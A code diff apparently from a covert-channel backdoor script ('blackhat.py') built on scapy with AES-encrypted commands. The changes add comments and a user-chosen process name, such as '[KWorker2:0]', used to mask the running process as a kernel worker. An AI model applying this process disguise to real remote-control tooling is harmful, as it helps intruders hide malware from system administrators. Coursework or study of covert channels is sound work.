@@ -22,29 +22,46 @@
 --  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
 --  'pip install scapy' or http://www.secdev.org/projects/scapy/
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
-import sys
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
-import os
-from Crypto.Cipher import AES
-import setproctitle
+import sys # Used for exiting the system on errors
+import logging #Dependancy for next import
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy 
+#              warnings so that nothing is printed to screen when packets are sent
+from scapy.all import * #Scapy packet crafting library
+import os # Used for executing commands on shell.
+from Crypto.Cipher import AES #Used to encrypt and decrypt messages
+import setproctitle #Used for process masking
 
-
+#################################GLOBAL VARIABLES#################################
 global clientIP
 global listening
 global ttlKey
 global decryptionKey
 global IV
 global dstPort
+global processName
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+--  FUNCTION
+--  Name:       Usage
+--  Parameters:
+--     None
+--  Return Values:
+--      None.
+--  Description:
+--      Ensures that user enters in the proper values by checking the number of arguments
+--      Command should be in the format python client.py <dstPort> <ttlKey>  <processName>
+--      <decryptionKey><IV>
+--      i.e. - python blackhat.py 192.168.0.5 80 71 0123456789abcdef abcdefghijklmnop [KWorker2:0]
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 
 def usage():
     global ttlKey
     global decryptionKey
     global IV
-    global dstPort
+    global dstPort 
+    global processName
     if len(sys.argv) < 4:
-        print "Please use format python client.py <dstPort> <ttlkey> <decryptionKey> <IV>"
+        print "Please use format python client.py <dstPort> <ttlkey> <decryptionKey> <IV> <processName>"
         sys.exit()
     else:
         if len(sys.argv[3]) < 16:
@@ -62,6 +79,8 @@ def usage():
         print "Decryption key is " + decryptionKey
         IV = sys.argv[4]
         print "IV is " + IV
+        processName = sys.argv[5]
+        print "Process Name is " + processName
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
@@ -142,12 +161,14 @@ def receivedPacket(packet):
         else:
             return False
 
-
+#MAIN() 
 if __name__ == "__main__":
     global dstPort
+    global processName
     usage()
+
     #Set process title to something less suspicious
-    setproctitle.setproctitle("Non-suspicious-program")
+    setproctitle.setproctitle(processName)
 
     #Listen for connections
     listening = True;
